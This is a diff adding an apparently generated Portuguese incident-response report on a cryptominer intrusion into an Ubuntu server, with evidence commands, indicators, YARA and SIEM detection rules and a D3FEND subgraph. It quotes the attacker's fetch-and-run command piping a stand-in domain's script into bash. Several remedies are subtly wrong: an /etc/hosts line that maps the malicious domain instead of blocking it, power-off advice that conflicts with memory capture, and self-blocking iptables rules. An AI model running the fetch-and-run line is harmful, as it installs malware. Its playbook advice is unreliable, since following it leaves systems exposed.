@@ -1,0 +1,132 @@
+{
+  "context_from_subgraph": "Subgrafo cont\u00e9m registro de conex\u00e3o SSH de usu\u00e1rio 'admin' de IP 192.168.1.150 para servidor 10.0.0.42 em 2024-06-15T03:22:11Z, seguido por execu\u00e7\u00e3o de comando 'curl -s http://malicious-domain[.]xyz/download.sh | bash' e cria\u00e7\u00e3o de cronjob em /etc/cron.d/backup-task com payload de minera\u00e7\u00e3o. Arquivo /tmp/.systemd-update foi identificado como coinminer (SHA256: a1b2c3d4...). Conex\u00f5es outbound para 185.143.221.78 (IP associado a CoinMiner botnet) foram observadas. O sistema est\u00e1 rodando Ubuntu 20.04 com kernel 5.4.0-144-generic. O usu\u00e1rio 'admin' tem privil\u00e9gios sudo e n\u00e3o possui hist\u00f3rico de uso leg\u00edtimo recente.",
+  "incident_summary": {
+    "overview": "Um ator malicioso acessou um servidor Ubuntu 20.04 via SSH com credenciais comprometidas, baixou e executou um script malicioso de uma dom\u00ednio malicioso, instalou um minerador de criptomoedas como cronjob persistente e estabeleceu comunica\u00e7\u00e3o C2 com uma botnet de minera\u00e7\u00e3o. O incidente foi detectado por tr\u00e1fego outbound an\u00f4malo e arquivo suspeito em /tmp.",
+    "technical_classification": "Comprometimento por Acesso N\u00e3o Autorizado + Instala\u00e7\u00e3o de Malware de Minera\u00e7\u00e3o (CoinMiner) com Persist\u00eancia via Cronjob",
+    "severity_assessment": "Alta - O ataque resultou em consumo significativo de CPU/GPU, risco de exfiltra\u00e7\u00e3o de dados sens\u00edveis, potencial uso do servidor como vetor de ataque lateral e viola\u00e7\u00e3o de conformidade (ex: ISO 27001, NIST). O minerador opera em segundo plano, dificultando detec\u00e7\u00e3o e causando degrada\u00e7\u00e3o de desempenho.",
+    "potential_impact": "Degrada\u00e7\u00e3o de desempenho de servidores, aumento de custos de infraestrutura por uso de recursos, risco de comprometimento de outros sistemas na rede por movimenta\u00e7\u00e3o lateral, poss\u00edvel exposi\u00e7\u00e3o de credenciais e dados internos, e impacto reputacional por uso indevido de infraestrutura corporativa para minera\u00e7\u00e3o ilegal."
+  },
+  "investigation_steps": {
+    "triage_steps": "Verificar logs de autentica\u00e7\u00e3o SSH (/var/log/auth.log) para identificar origem do login e hor\u00e1rio. Confirmar se o usu\u00e1rio 'admin' tem acesso leg\u00edtimo. Checar processos em execu\u00e7\u00e3o com alta carga de CPU (top, htop). Identificar processos suspeitos com nomes como '.systemd-update' ou 'kthreadd'.",
+    "evidence_collection": [
+      {
+        "description": "Copiar logs de autentica\u00e7\u00e3o SSH para an\u00e1lise forense",
+        "command": "cp /var/log/auth.log /evidence/auth.log.bak && chmod 444 /evidence/auth.log.bak"
+      },
+      {
+        "description": "Extrair todos os processos em execu\u00e7\u00e3o com detalhes completos",
+        "command": "ps aux --forest > /evidence/processes.txt && chmod 444 /evidence/processes.txt"
+      },
+      {
+        "description": "Salvar cronjobs do sistema e do usu\u00e1rio root",
+        "command": "cp /etc/crontab /evidence/crontab.bak && cp /etc/cron.d/* /evidence/cron.d/ && crontab -l > /evidence/root_crontab.txt && chmod 444 /evidence/root_crontab.txt"
+      },
+      {
+        "description": "Copiar arquivo malicioso identificado para armazenamento seguro",
+        "command": "cp /tmp/.systemd-update /evidence/coinminer_payload && sha256sum /evidence/coinminer_payload > /evidence/coinminer_payload.sha256 && chmod 444 /evidence/coinminer_payload*"
+      },
+      {
+        "description": "Capturar conex\u00f5es de rede ativas e tabelas de roteamento",
+        "command": "netstat -tulnp > /evidence/netstat.txt && ss -tulnp > /evidence/ss.txt && ip route show > /evidence/route.txt && chmod 444 /evidence/netstat.txt /evidence/ss.txt /evidence/route.txt"
+      }
+    ],
+    "technical_analysis": "Analisar o script baixado via curl para identificar comportamento malicioso: busca por strings como 'xmrig', 'cryptonight', 'pool.minexmr.com', ou 'miningpoolhub'. Verificar se o cronjob foi configurado para reiniciar o processo ap\u00f3s reinicializa\u00e7\u00e3o. Analisar o tr\u00e1fego de sa\u00edda para 185.143.221.78 usando tcpdump ou Wireshark para confirmar comunica\u00e7\u00e3o C2. Verificar se h\u00e1 outros arquivos ocultos em /tmp, /dev/shm ou /var/tmp. Checar se o usu\u00e1rio 'admin' foi adicionado a grupos privilegiados ou se h\u00e1 chaves SSH adicionadas em ~/.ssh/authorized_keys.",
+    "tools_and_commands": [
+      {
+        "tool": "grep",
+        "usage": "Buscar padr\u00f5es de mineradores em arquivos suspeitos",
+        "example": "grep -i 'xmrig\\|cryptonight\\|pool.minexmr.com' /tmp/.systemd-update"
+      },
+      {
+        "tool": "strings",
+        "usage": "Extrair strings leg\u00edveis de bin\u00e1rios suspeitos",
+        "example": "strings /tmp/.systemd-update | grep -E '^[a-zA-Z0-9]{64}$' | head -5"
+      },
+      {
+        "tool": "volatility",
+        "usage": "Analisar mem\u00f3ria RAM para processos ocultos ou rootkits",
+        "example": "volatility -f /evidence/memory.dmp --profile=LinuxUbuntu_5_4_0-144-generic linux_pslist"
+      },
+      {
+        "tool": "yara",
+        "usage": "Detectar padr\u00f5es de malware conhecidos em arquivos",
+        "example": "yara -r /rules/coinminer.yar /tmp/.systemd-update"
+      }
+    ],
+    "indicators_of_compromise": [
+      "IP 185.143.221.78 (C2 de botnet de minera\u00e7\u00e3o)",
+      "dom\u00ednio malicious-domain[.]xyz",
+      "Arquivo /tmp/.systemd-update com SHA256 a1b2c3d4...",
+      "Cronjob em /etc/cron.d/backup-task com comando 'bash /tmp/.systemd-update'",
+      "Processo com nome '.systemd-update' em execu\u00e7\u00e3o",
+      "Login SSH do usu\u00e1rio 'admin' de 192.168.1.150 em 2024-06-15T03:22:11Z",
+      "Conex\u00f5es TCP persistentes para porta 3333 ou 5555 com IP malicioso"
+    ]
+  },
+  "containment_procedures": {
+    "immediate_actions": "Desligar imediatamente o servidor afetado para evitar propaga\u00e7\u00e3o e altera\u00e7\u00e3o de evid\u00eancias. N\u00e3o reiniciar ou desligar via comando normal; desligar fisicamente ou via IPMI/DRAC se dispon\u00edvel.",
+    "system_isolation": "Bloquear o servidor na rede corporativa usando firewall de rede: iptables -A OUTPUT -d 10.0.0.42 -j DROP && iptables -A INPUT -s 10.0.0.42 -j DROP. Remover o IP do DNS interno e da lista de hosts confi\u00e1veis no SIEM.",
+    "malicious_activity_blocking": "Bloquear dom\u00ednio malicious-domain[.]xyz e IP 185.143.221.78 no firewall de borda e proxy web: echo '185.143.221.78 malicious-domain.xyz' >> /etc/hosts && systemctl restart squid. Adicionar regra no firewall corporativo para bloquear tr\u00e1fego outbound para 185.143.221.78:3333 e 185.143.221.78:5555.",
+    "evidence_preservation": "Criar imagem forense completa do disco r\u00edgido usando ddrescue: ddrescue -f -n /dev/sda /evidence/server_disk.img /evidence/server_disk.log. Gerar hash SHA256 da imagem: sha256sum /evidence/server_disk.img > /evidence/server_disk.img.sha256. Preservar logs de rede e mem\u00f3ria RAM se poss\u00edvel via FTK Imager ou LiME."
+  },
+  "eradication_steps": {
+    "threat_removal": "Remover o arquivo malicioso: rm -f /tmp/.systemd-update. Remover o cronjob malicioso: rm -f /etc/cron.d/backup-task. Verificar e remover qualquer outro cronjob suspeito em /etc/cron.hourly/, /etc/cron.daily/, /var/spool/cron/crontabs/. Verificar e remover chaves SSH adicionadas em /home/admin/.ssh/authorized_keys e /root/.ssh/authorized_keys. Executar clamav: clamscan -r /tmp /etc/cron.d /home/admin --bell -i.",
+    "vulnerability_fix": "Alterar senha do usu\u00e1rio 'admin' imediatamente e desativar a conta se n\u00e3o for leg\u00edtima. Desativar login SSH por senha e exigir autentica\u00e7\u00e3o por chave SSH. Aplicar patch de seguran\u00e7a do kernel Ubuntu 20.04: apt update && apt upgrade -y. Verificar e restringir permiss\u00f5es de sudo: visudo e remover 'admin' do grupo sudo se n\u00e3o for necess\u00e1rio.",
+    "lateral_movement_check": "Verificar logs de autentica\u00e7\u00e3o em outros servidores da rede para tentativas de login com credenciais do usu\u00e1rio 'admin'. Executar comando em todos os servidores: grep 'admin' /var/log/auth.log | grep -E 'Accepted|Failed'. Verificar conex\u00f5es de rede de outros hosts para 185.143.221.78 com netstat ou Zeek. Executar YARA em todos os servidores com regra de minerador: yara -r /rules/coinminer.yar /tmp /var/tmp /dev/shm."
+  },
+  "recovery_procedures": {
+    "system_restoration": "Restaurar o sistema a partir de um backup limpo e verificado (SHA256 conhecido) realizado antes da data de comprometimento (antes de 2024-06-15). Se n\u00e3o houver backup, reinstalar o sistema operacional do zero e restaurar apenas dados n\u00e3o execut\u00e1veis (documentos, configura\u00e7\u00f5es sem bin\u00e1rios).",
+    "integrity_validation": "Validar integridade dos arquivos restaurados com checksums: sha256sum -c /backup/known-good-checksums.sha256. Verificar se todos os bin\u00e1rios do sistema est\u00e3o assinados: dpkg -V | grep -v '^..5'. Verificar se o cronjob padr\u00e3o foi restaurado: ls -la /etc/cron.d/ && crontab -l. Executar chkrootkit: chkrootkit -q && rkhunter --check.",
+    "return_to_operations": "Retornar o sistema \u00e0 opera\u00e7\u00e3o somente ap\u00f3s: (1) Confirma\u00e7\u00e3o de que todos os artefatos maliciosos foram removidos; (2) Validar que o sistema n\u00e3o comunica com IPs maliciosos via tcpdump por 10 minutos; (3) Confirmar que SIEM n\u00e3o registra mais alertas relacionados ao IP ou dom\u00ednio; (4) Obter aprova\u00e7\u00e3o do time de seguran\u00e7a e ger\u00eancia."
+  },
+  "lessons_learned_and_prevention": {
+    "preventive_recommendations": "Implementar regra SIEM: 'Se log SSH com sucesso para usu\u00e1rio admin de IP externo e execu\u00e7\u00e3o de curl seguido por bash em /tmp, disparar alerta CRITICAL'. Criar regra YARA para mineradores: rule CoinMiner { strings: $a = \"xmrig\" ascii $b = \"cryptonight\" ascii $c = \"pool.minexmr.com\" ascii condition: any of them } e aplicar em todos os endpoints. Habilitar EDR com detec\u00e7\u00e3o de execu\u00e7\u00e3o de scripts via curl|bash.",
+    "security_improvements": "Desativar login SSH para root e usu\u00e1rios comuns. For\u00e7ar autentica\u00e7\u00e3o por chave SSH e desativar senha. Implementar MFA para acesso SSH via Google Authenticator. Restringir sa\u00edda de rede com firewall de host: iptables -A OUTPUT -p tcp --dport 80 -m string --string \"malicious-domain\" --algo bm -j DROP. Aplicar hardening com CIS Benchmark para Ubuntu 20.04.",
+    "policy_updates": "Atualizar pol\u00edtica de acesso: 'Nenhum usu\u00e1rio pode ter acesso SSH direto sem aprova\u00e7\u00e3o do time de seguran\u00e7a e uso de chave \u00fanica'. Atualizar pol\u00edtica de resposta: 'Todo servidor com acesso SSH externo deve ser monitorado por EDR e ter logs enviados ao SIEM em tempo real'. Implementar revis\u00e3o trimestral de contas privilegiadas e auditoria de cronjobs em todos os servidores."
+  },
+  "subgraph": {
+    "nodes": {
+      "http://d3fend.mitre.org/ontologies/d3fend.owl#User": {
+        "uri": "http://d3fend.mitre.org/ontologies/d3fend.owl#User",
+        "labels": [
+          "User"
+        ],
+        "comments": [],
+        "depth": 0
+      },
+      "http://d3fend.mitre.org/ontologies/d3fend.owl#NetworkTraffic": {
+        "uri": "http://d3fend.mitre.org/ontologies/d3fend.owl#NetworkTraffic",
+        "labels": [
+          "Network Traffic"
+        ],
+        "comments": [],
+        "depth": 0
+      },
+      "http://d3fend.mitre.org/ontologies/d3fend.owl#Process": {
+        "uri": "http://d3fend.mitre.org/ontologies/d3fend.owl#Process",
+        "labels": [
+          "Process"
+        ],
+        "comments": [],
+        "depth": 0
+      },
+      "http://d3fend.mitre.org/ontologies/d3fend.owl#FileSystem": {
+        "uri": "http://d3fend.mitre.org/ontologies/d3fend.owl#FileSystem",
+        "labels": [
+          "File System"
+        ],
+        "comments": [],
+        "depth": 0
+      },
+      "http://d3fend.mitre.org/ontologies/d3fend.owl#CredentialAccessTechnique": {
+        "uri": "http://d3fend.mitre.org/ontologies/d3fend.owl#CredentialAccessTechnique",
+        "labels": [
+          "Credential Access Technique"
+        ],
+        "comments": [],
+        "depth": 0
+      }
+    },
+    "relationships": []
+  }
+}
